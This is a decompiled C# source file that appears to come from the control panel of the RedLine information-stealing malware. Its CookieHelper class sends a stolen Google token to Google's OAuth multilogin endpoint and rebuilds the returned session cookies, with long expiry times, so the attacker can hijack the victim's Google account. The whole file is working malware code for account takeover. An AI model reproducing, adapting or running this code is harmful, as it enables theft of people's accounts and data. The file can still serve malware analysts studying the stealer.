using System;
using System.Collections.Generic;
using RedLine.MainPanel.Data.Extensions;
using RedLine.SharedModels;
using RestSharp;

namespace RedLine.MainPanel.Data.Helpers;

public static class CookieHelper
{
	public static List<Cookie> Refresh(string token)
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Expected O, but got Unknown
		//IL_0078: Expected O, but got Unknown
		List<Cookie> list = new List<Cookie>();
		try
		{
			RestClient val = new RestClient("https://accounts.google.com/oauth/multilogin");
			RestRequest val2 = new RestRequest((Method)1);
			val2.AddHeader("Accept", "*/*");
			val2.AddHeader("Authorization", "MultiBearer " + token);
			val2.AddHeader("Accept-Language", "en-US,en;q=0.9");
			val2.AddHeader("Content-Type", "application/x-www-form-urlencoded");
			val2.AddQueryParameter("source", "com.google.Drive");
			dynamic val3 = RestClientExtensions.Post((IRestClient)val, (IRestRequest)(object)val2).Content.Replace(")]}'", string.Empty).FromJSON<object>();
			foreach (dynamic item in val3["cookies"])
			{
				string text = null;
				try
				{
					if (item["domain"] != null)
					{
						text = item["domain"].ToString();
					}
				}
				catch (Exception)
				{
				}
				if (string.IsNullOrWhiteSpace(text))
				{
					try
					{
						text = item["host"].ToString();
					}
					catch (Exception)
					{
					}
				}
				if (!string.IsNullOrWhiteSpace(text))
				{
					list.Add(new Cookie
					{
						Expires = 1800000000L,
						Host = text,
						Http = true,
						Path = item["path"].ToString(),
						Secure = false,
						Name = item["name"].ToString(),
						Value = item["value"].ToString()
					});
				}
			}
		}
		catch (Exception)
		{
		}
		return list;
	}
}
